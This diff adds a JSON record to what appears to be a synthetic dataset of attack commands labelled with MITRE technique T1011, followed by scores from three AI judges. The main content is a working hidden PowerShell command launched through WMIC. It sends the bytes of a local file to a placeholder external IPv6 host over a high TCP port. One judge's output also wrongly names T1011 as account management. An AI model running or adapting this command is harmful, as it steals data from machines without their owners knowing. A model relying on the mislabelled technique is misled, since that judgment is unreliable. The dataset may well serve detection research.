@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*6to4*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:2::44'); `$c.Connect(`$rv6,60023); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Pictures\\thumbcache.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Executes PowerShell through WMIC to bind to a 6to4 IPv6 interface and exfiltrate a file over IPv6 using a high TCP port. This leverages an alternate IPv6 transition medium in accordance with T1011.",
+  "rationale_steps": [
+    "Locate the 6to4 adapter and extract an IPv6 address.",
+    "Bind an IPv6 TCP client to the selected interface.",
+    "Connect to an IPv6 external host on an uncommon port.",
+    "Transfer data over the 6to4 path instead of the primary network.",
+    "Keep changes confined to the exfiltration process."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-c70ba636",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, correct PowerShell syntax including variable declarations, pipeline operators, and method calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1011 technique by identifying a 6to4 IPv6 interface, binding to it, and exfiltrating a file over IPv6 to a remote server using a high port (60023), effectively demonstrating data exfiltration over an alternate protocol.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T10:18:19.505643Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced quotes, and proper escaping of variables for execution within WMIC's `create` method.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command technically performs file exfiltration over an IPv6 connection potentially using a 6to4 interface, its claimed alignment with MITRE ATT&CK Technique T1011 (Establish Accounts) is completely incorrect, as T1011 is about identity management, not data exfiltration or network communication methods.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T10:18:40.770375Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Balanced quoting and valid PowerShell/WMIC structure, though the unquoted -Command payload and pervasive backtick usage could cause edge-case parsing issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It launches hidden PowerShell via WMIC, selects a 6to4 IPv6 interface, binds an IPv6 socket, connects to a remote IPv6 endpoint, and streams file bytes, aligning with exfiltration over an alternate network medium, albeit using a documentation-only IPv6 address and relying on a 6to4 adapter.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T10:19:37.752928Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
